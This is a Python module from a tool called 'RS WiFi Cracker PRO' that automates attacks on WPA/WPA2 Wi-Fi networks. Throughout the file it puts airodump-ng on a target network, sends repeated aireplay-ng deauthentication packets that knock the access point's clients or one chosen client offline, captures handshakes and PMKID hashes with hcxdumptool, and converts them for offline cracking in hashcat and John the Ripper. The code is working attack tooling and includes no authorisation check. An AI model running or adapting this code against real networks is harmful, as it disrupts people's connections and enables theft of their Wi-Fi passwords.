#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - Handshake Capturer Module"""
import os
import time
import subprocess
import re
from typing import Optional
from datetime import datetime
from .types import HandshakeCapture


class HandshakeCapturer:
    """WPA/WPA2 handshake capture module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.capture_dir = "/tmp/rs-wifi-captures/handshakes"
        os.makedirs(self.capture_dir, exist_ok=True)
    
    def capture(self, bssid: str, channel: int, essid: str = "", 
                timeout: int = 300, deauth: bool = True, 
                deauth_count: int = 5) -> Optional[HandshakeCapture]:
        """Capture WPA/WPA2 handshake"""
        self.logger.info(f"Starting handshake capture for {bssid}...")
        
        # Set channel
        subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], 
                      capture_output=True)
        
        output_file = os.path.join(self.capture_dir, f"{bssid.replace(':', '')}")
        
        # Start airodump-ng
        cmd = [
            'airodump-ng', self.interface,
            '-c', str(channel),
            '--bssid', bssid,
            '-w', output_file
        ]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Send deauth packets
        if deauth:
            time.sleep(2)
            for i in range(deauth_count):
                self.logger.progress(f"Sending deauth packet {i+1}/{deauth_count}")
                subprocess.run([
                    'aireplay-ng', '-0', '5', '-a', bssid, self.interface
                ], capture_output=True)
                time.sleep(3)
                
                # Check for handshake
                cap_file = output_file + "-01.cap"
                if os.path.exists(cap_file):
                    if self._check_handshake(cap_file, bssid):
                        process.terminate()
                        handshake = HandshakeCapture(
                            bssid=bssid,
                            essid=essid,
                            capture_file=cap_file
                        )
                        if self.db:
                            self.db.save_handshake(handshake)
                        self.logger.success("Handshake captured!")
                        return handshake
        
        # Wait for timeout
        start_time = time.time()
        while time.time() - start_time < timeout:
            time.sleep(5)
            cap_file = output_file + "-01.cap"
            if os.path.exists(cap_file):
                if self._check_handshake(cap_file, bssid):
                    process.terminate()
                    handshake = HandshakeCapture(
                        bssid=bssid,
                        essid=essid,
                        capture_file=cap_file
                    )
                    if self.db:
                        self.db.save_handshake(handshake)
                    self.logger.success("Handshake captured!")
                    return handshake
        
        process.terminate()
        self.logger.warning("No handshake captured within timeout")
        return None
    
    def _check_handshake(self, cap_file: str, bssid: str) -> bool:
        """Check if handshake exists in capture file"""
        try:
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True, text=True
            )
            return '1 handshake' in result.stdout.lower()
        except:
            return False
    
    def capture_pmkid(self, bssid: str, channel: int, essid: str = "",
                      timeout: int = 60) -> Optional[HandshakeCapture]:
        """Capture PMKID (clientless attack)"""
        self.logger.info(f"Attempting PMKID capture for {bssid}...")
        
        output_file = os.path.join(self.capture_dir, f"pmkid_{bssid.replace(':', '')}")
        
        try:
            # Set channel
            subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], 
                          capture_output=True)
            
            # Use hcxdumptool
            cmd = [
                'hcxdumptool', '-i', self.interface,
                '-o', output_file + '.pcapng',
                '--enable_status=1'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(5)
                if os.path.exists(output_file + '.pcapng'):
                    # Convert to hash format
                    result = subprocess.run(
                        ['hcxpcapngtool', '-o', output_file + '.hash', output_file + '.pcapng'],
                        capture_output=True, text=True
                    )
                    if os.path.exists(output_file + '.hash'):
                        with open(output_file + '.hash', 'r') as f:
                            if bssid.lower() in f.read().lower():
                                process.terminate()
                                handshake = HandshakeCapture(
                                    bssid=bssid,
                                    essid=essid,
                                    capture_file=output_file + '.hash'
                                )
                                if self.db:
                                    self.db.save_handshake(handshake)
                                self.logger.success("PMKID captured!")
                                return handshake
            
            process.terminate()
        except FileNotFoundError:
            self.logger.error("hcxdumptool not found. Install: apt install hcxdumptool")
        except Exception as e:
            self.logger.error(f"PMKID capture failed: {e}")
        
        return None
    
    def capture_with_client_deauth(self, bssid: str, channel: int, 
                                   client_mac: str, essid: str = "") -> Optional[HandshakeCapture]:
        """Capture handshake by deauthenticating specific client"""
        self.logger.info(f"Targeting client {client_mac} on {bssid}...")
        
        # Set channel
        subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], 
                      capture_output=True)
        
        output_file = os.path.join(self.capture_dir, f"{bssid.replace(':', '')}_{client_mac.replace(':', '')}")
        
        # Start airodump-ng
        cmd = [
            'airodump-ng', self.interface,
            '-c', str(channel),
            '--bssid', bssid,
            '-w', output_file
        ]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Deauth specific client
        for _ in range(10):
            subprocess.run([
                'aireplay-ng', '-0', '10', '-a', bssid, '-c', client_mac, self.interface
            ], capture_output=True)
            time.sleep(2)
            
            cap_file = output_file + "-01.cap"
            if os.path.exists(cap_file):
                if self._check_handshake(cap_file, bssid):
                    process.terminate()
                    handshake = HandshakeCapture(
                        bssid=bssid,
                        essid=essid,
                        capture_file=cap_file
                    )
                    if self.db:
                        self.db.save_handshake(handshake)
                    self.logger.success("Handshake captured from client!")
                    return handshake
        
        process.terminate()
        return None
    
    def convert_to_hashcat(self, cap_file: str) -> Optional[str]:
        """Convert .cap file to hashcat format"""
        try:
            hccapx_file = cap_file.replace('.cap', '.hccapx')
            result = subprocess.run([
                'aircrack-ng', '-J', hccapx_file.replace('.hccapx', ''), cap_file
            ], capture_output=True, text=True)
            
            if os.path.exists(hccapx_file):
                self.logger.success(f"Converted to hashcat format: {hccapx_file}")
                return hccapx_file
        except Exception as e:
            self.logger.error(f"Conversion failed: {e}")
        
        return None
    
    def convert_to_john(self, cap_file: str) -> Optional[str]:
        """Convert .cap file to John the Ripper format"""
        try:
            john_file = cap_file + '.john'
            result = subprocess.run([
                '/usr/share/john/wpapcap2john.py', cap_file
            ], capture_output=True, text=True)
            
            with open(john_file, 'w') as f:
                f.write(result.stdout)
            
            if os.path.exists(john_file):
                self.logger.success(f"Converted to John format: {john_file}")
                return john_file
        except Exception as e:
            self.logger.error(f"Conversion failed: {e}")
        
        return None
